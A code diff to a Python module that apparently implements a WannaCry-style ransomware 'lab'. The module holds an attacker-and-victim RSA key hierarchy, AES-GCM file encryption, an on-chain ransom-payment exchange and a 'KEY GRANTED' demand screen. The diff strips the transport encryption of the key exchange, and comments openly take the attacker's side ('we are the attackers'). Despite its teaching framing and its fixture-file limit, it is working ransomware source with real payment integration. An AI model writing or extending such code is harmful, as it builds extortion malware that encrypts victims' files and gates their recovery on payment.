@@ -12,16 +12,17 @@ This module implements the WannaCry-style key hierarchy as a teaching model:
   3. One symmetric AES-256-GCM file key encrypts all five samples. The file key
      is sealed under victim_pub and stored locally.
 
-Decryption chain: attacker_priv -> victim_priv -> file key -> files. No victim
+  Decryption chain: attacker_priv -> victim_priv -> file key -> files. No victim
 key material in plaintext on disk is ever needed by the chain itself.
 
-For the blockchain exchange, a separate ephemeral X25519 keypair is generated
-per request. The victim posts (ephemeral_pub, sealed victim_priv) on-chain;
-the attacker decrypts victim_priv offline and replies with ONLY victim_priv,
-sealed under the ECDH shared key — the victim then unseals its own file key
-locally, so key material beyond victim_priv never travels. This is a
-per-request channel, not a third persistent keypair. Ethereum wallet keys are
-unrelated to this module.
+For the blockchain exchange there is no privacy sealing: as the attackers we
+do not care about victim confidentiality, so key material travels on-chain as
+it is. The victim posts the sealed victim_priv blob (opaque without
+attacker_priv); after payment the attacker's watch posts the recovered
+victim_priv back in PLAINTEXT. The victim's menu then GRANTS the unsealed AES
+file key on screen — the victim copies it into decryptor.py, which restores
+the files (WannaCry-style manual key hand-off instead of silent auto-recovery).
+Ethereum wallet keys are unrelated to this module.
 
 The scenario stays limited to the five exact generated fixture documents, as
 the rest of the lab does. It is a reversible lab demonstration, not a general
@@ -37,9 +38,8 @@ from pathlib import Path
 import tempfile
 
 from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import padding, rsa, x25519
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 
 from file_generator import FILES
 
@@ -287,10 +287,12 @@ def recover_samples(
         entry = keylog["files"][name]
         nonce = unb64(entry["nonce"])
         context = f"{participant_id}/{name}".encode("utf-8")
+        print(f"  decrypting {name}...", end="", flush=True)
         plain = AESGCM(file_key).decrypt(nonce, unb64(entry["ciphertext"]), context)
         digest = hashlib.sha256(plain).hexdigest()
         if digest != baseline.get(name):
             raise ValueError(f"recovered sample does not match its baseline: {name}")
+        print(" hash verified")
         write_atomic(target / name, plain)
         # Restore the original name by removing the ransomware envelope.
         (target / (name + ENCRYPTED_SUFFIX)).unlink(missing_ok=True)
@@ -298,144 +300,84 @@ def recover_samples(
 
 
 # --------------------------------------------------------------------------
-# Blockchain exchange (ephemeral channel, not a third persistent keypair)
+# Blockchain exchange (plaintext on-chain; no privacy — we are the attackers)
 # --------------------------------------------------------------------------
 
 def build_exchange_request(keylog: dict) -> dict:
     """Victim side: build the on-chain request payload.
 
-    The victim generates an ephemeral X25519 keypair for this request only.
-    The sealed victim_priv blob is copied from the keylog; it is inert without
-    attacker_priv. A production system would sign this message with the
-    participant's Ethereum wallet key (lab_wallet.py) to authenticate it, but
-    the wallet key never encrypts file material.
+    The sealed victim_priv blob is copied from the keylog; it is inert
+    without attacker_priv, so posting it on a public chain leaks nothing
+    the attacker alone can open. No ephemeral keypair and no transport
+    sealing: the original incident's operators had no such concern, and
+    neither do we.
     """
-    ephemeral = x25519.X25519PrivateKey.generate()
-    request = {
+    return {
         "participant_id": keylog["participant_id"],
-        "ephemeral_pub_b64": b64(
-            ephemeral.public_key().public_bytes(
-                serialization.Encoding.Raw,
-                serialization.PublicFormat.Raw,
-            )
-        ),
         "victim_priv_sealed": keylog["victim_priv_sealed"],
         "attacker_pub_fingerprint": hashlib.sha256(
             keylog["attacker_pub_pem"].encode("ascii")
         ).hexdigest()[:16],
     }
-    # The ephemeral private key exists only while the request is open; in a
-    # lab run it is kept in the keylog for the reply step. Keep it local.
-    request["_ephemeral_priv_b64"] = b64(
-        ephemeral.private_bytes(
-            serialization.Encoding.Raw,
-            serialization.PrivateFormat.Raw,
-            serialization.NoEncryption(),
-        )
-    )
-    return request
 
 
-def _ecdh_channel(own_priv_x25519, peer_pub_raw: bytes) -> bytes:
-    """Derive an AES key from X25519 shared secret via HKDF-SHA256."""
-    peer = x25519.X25519PublicKey.from_public_bytes(peer_pub_raw)
-    shared = own_priv_x25519.exchange(peer)
-    return HKDF(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=None,
-        info=b"y04-keylogic-exchange",
-    ).derive(shared)
+def attacker_build_reply(victim_priv_pem: bytes) -> dict:
+    """Attacker side: the on-chain reply carries victim_priv in plaintext.
 
-
-def attacker_build_reply(request: dict, victim_priv_pem: bytes) -> dict:
-    """Attacker side: seal the recovered victim key to the victim's ephemeral key.
-
-    The reply carries ONLY victim_priv. The file key never travels: the
-    victim holds file_key_sealed locally and opens it with the recovered
-    victim key (victim_open_file_key). The reply is the on-chain payload that
-    only the requesting victim host can open, because only it holds the
-    ephemeral private key from step one.
+    Nothing is sealed for transport — the reply exists only after the ransom
+    arrived, so there is nothing to hide. The victim reads it back and
+    unseals its own file key locally with the recovered victim key.
     """
-    ephemeral = x25519.X25519PrivateKey.generate()
-    reply_key = _ecdh_channel(
-        ephemeral, unb64(request["ephemeral_pub_b64"])
-    )
-    reply_pub_raw = ephemeral.public_key().public_bytes(
-        serialization.Encoding.Raw, serialization.PublicFormat.Raw
-    )
-    nonce = os.urandom(NONCE_SIZE)
-    payload = json.dumps(
-        {"victim_priv_pem": victim_priv_pem.decode("ascii")}
-    ).encode("utf-8")
     return {
-        "participant_id": request.get("participant_id", ""),
-        "reply_pub_b64": b64(reply_pub_raw),
-        "nonce": b64(nonce),
-        "ct": b64(AESGCM(reply_key).encrypt(nonce, payload, None)),
+        "participant_id": "",
+        "victim_priv_pem": victim_priv_pem.decode("ascii"),
     }
 
 
 def save_exchange_request(keylog: dict, path: Path) -> dict:
     """Victim side: build and persist the exchange request.
 
-    The returned dict is what goes on the chain: it contains only public data
-    plus the inert sealed blob. The ephemeral private key is stored locally
-    beside the keylog so the reply can be opened; it lives only for this
-    exchange and is never shared.
+    The returned dict is what goes on the chain: public metadata plus the
+    inert sealed blob. No local secrets are kept for the reply step — the
+    plaintext reply needs no local key to read.
     """
     request = build_exchange_request(keylog)
-    ephemeral_priv_b64 = request.pop("_ephemeral_priv_b64")
-    local = dict(request, ephemeral_priv_b64=ephemeral_priv_b64)
-    write_json(path, local, private=True)
+    write_json(path, request, private=True)
     return request
 
 
-def victim_accept_reply(request_path: Path, reply: dict, keylog: dict = None) -> dict:
-    """Victim side: open the attacker's reply with the saved ephemeral key.
+def victim_accept_reply(reply: dict, keylog: dict) -> dict:
+    """Victim side: read the attacker's plaintext reply and unseal the file key.
 
-    The reply carries victim_priv. When the local keylog is provided (the
-    normal case), the file key is unsealed locally with the recovered victim
-    key — key material the attacker never needed to see. Replies that still
-    embed a file key (older manual-path format) are accepted unchanged.
+    The reply carries victim_priv in the clear (payment-gated on-chain).
+    The file key is unsealed locally with the recovered victim key.
     """
-    saved = json.loads(request_path.read_text(encoding="utf-8"))
-    ephemeral = x25519.X25519PrivateKey.from_private_bytes(
-        unb64(saved["ephemeral_priv_b64"])
+    if "victim_priv_pem" not in reply:
+        raise ValueError("reply carries no victim key; nothing to accept")
+    file_key = victim_open_file_key(
+        reply["victim_priv_pem"].encode("ascii"), keylog
     )
-    channel = _ecdh_channel(ephemeral, unb64(reply["reply_pub_b64"]))
-    payload = AESGCM(channel).decrypt(unb64(reply["nonce"]), unb64(reply["ct"]), None)
-    opened = json.loads(payload)
-    if "file_key" in opened:
-        file_key = unb64(opened["file_key"])
-    elif keylog is not None:
-        file_key = victim_open_file_key(
-            opened["victim_priv_pem"].encode("ascii"), keylog
-        )
-    else:
-        raise ValueError(
-            "reply carries no file key and no local keylog was provided to derive it"
-        )
     return {
-        "victim_priv_pem": opened["victim_priv_pem"].encode("ascii"),
+        "victim_priv_pem": reply["victim_priv_pem"].encode("ascii"),
         "file_key": file_key,
     }
 
 
 def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: str = None):
-    """One UI-driven step of the exchange and recovery walk-through.
+    """One UI-driven step of the exchange, ending at the KEY GRANT.
 
     Called from the ransomware demand screen (option 5). Each call performs
     the next legal step and explains what must happen on which machine:
 
       1. Before any payload: instruct how to execute the payload.
-      2. No exchange yet: build the on-chain request (ephemeral X25519 key +
-         the inert sealed victim_priv blob). When a wallet and the chain
-         config exist, register it on-chain with real payment; the manual
-         file-copy path remains the fallback otherwise.
-      3. exchange_reply.json present (posted by the attacker on-chain, or
-         dropped back by the attacker side): accept it, unseal the file key,
-         recover the documents.
+      2. No exchange yet: build the on-chain request (the inert sealed
+         victim_priv blob). When a wallet and the chain config exist,
+         register it on-chain with real payment; the manual file-copy
+         path remains the fallback otherwise.
+      3. exchange_reply.json present (posted by the attacker's watch
+         on-chain): accept it, unseal the file key, print the KEY GRANTED
+         screen with the AES key to copy - and STOP. The victim runs
+         decryptor.py with that key; recovery is manual, not silent.
     """
     keylog_path = lab_dir / "lab_keylogic.json"
     request_path = lab_dir / "exchange_request.json"
@@ -451,21 +393,29 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
         )
     keylog = json.loads(keylog_path.read_text(encoding="utf-8"))
 
-    if reply_path.exists():
+    def grant_file_key():
+        """Accept the reply, save the key, print the grant; recover nothing."""
         reply = json.loads(reply_path.read_text(encoding="utf-8"))
-        opened = victim_accept_reply(request_path, reply, keylog)
+        opened = victim_accept_reply(reply, keylog)
         write_json(accepted_path, {
             "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
             "file_key_b64": b64(opened["file_key"]),
         }, private=True)
         print("Attacker reply accepted; file key unsealed with recovered victim key.")
-        recover_samples(
-            opened["file_key"],
-            target,
-            keylog["participant_id"],
-            keylog,
-            state_file,
-        )
+        print()
+        print("=" * 60)
+        print("  KEY GRANTED - YOUR DECRYPTION KEY (copy it):")
+        print()
+        print(f"  {b64(opened['file_key'])}")
+        print("=" * 60)
+        print()
+        print("Run the decryptor on this host and paste this key when asked:")
+        print("  python3 /opt/wannacry-v2/decryptor.py")
+        print("It decrypts your documents and verifies them against the")
+        print("recorded baselines. Nothing is recovered until you do.")
+
+    if reply_path.exists():
+        grant_file_key()
         return
 
     if not request_path.exists():
@@ -505,26 +455,13 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
             print(f"\nOn-chain exchange unavailable: {error}")
             print("Falling back to the manual copy path. Current instructions:")
         else:
-            reply = json.loads(reply_path.read_text(encoding="utf-8"))
-            opened = victim_accept_reply(request_path, reply, keylog)
-            write_json(accepted_path, {
-                "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
-                "file_key_b64": b64(opened["file_key"]),
-            }, private=True)
-            print("Attacker reply accepted; file key unsealed with recovered victim key.")
-            recover_samples(
-                opened["file_key"],
-                target,
-                keylog["participant_id"],
-                keylog,
-                state_file,
-            )
+            grant_file_key()
             return
 
     print("\nNext: on the attacker machine run the reply step with the attacker")
     print("keys, then copy the reply output to:")
     print(f"  {reply_path}")
-    print("Then choose document recovery again to accept and decrypt.")
+    print("Then choose document recovery again to accept it and get your key.")
 
 
 # --------------------------------------------------------------------------
@@ -665,15 +602,15 @@ def main():
         return
 
     if args.action == "reply":
-        if not args.in_path:
-            raise SystemExit("reply needs --in request.json")
+        # Manual path: recover victim_priv from the keylog's sealed blob.
+        # The reply carries it in plaintext; on the live path the watch
+        # action does this on-chain instead.
         attacker_keys = json.loads(args.attacker_keys.read_text(encoding="utf-8"))
         keylog = json.loads(args.keylog.read_text(encoding="utf-8"))
         victim_priv_pem = attacker_open_victim_priv(
             unb64(attacker_keys["attacker_priv_pem"]), keylog
         )
-        request = json.loads(args.in_path.read_text(encoding="utf-8"))
-        reply = attacker_build_reply(request, victim_priv_pem)
+        reply = attacker_build_reply(victim_priv_pem)
         print(json.dumps(reply, indent=2))
         return
 
@@ -682,9 +619,7 @@ def main():
             raise SystemExit("accept needs --in reply.json and --out accepted.json")
         reply = json.loads(args.in_path.read_text(encoding="utf-8"))
         keylog = json.loads(args.keylog.read_text(encoding="utf-8"))
-        opened = victim_accept_reply(
-            args.keylog.parent / "exchange_request.json", reply, keylog
-        )
+        opened = victim_accept_reply(reply, keylog)
         write_json(args.out_path, {
             "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
             "file_key_b64": b64(opened["file_key"]),
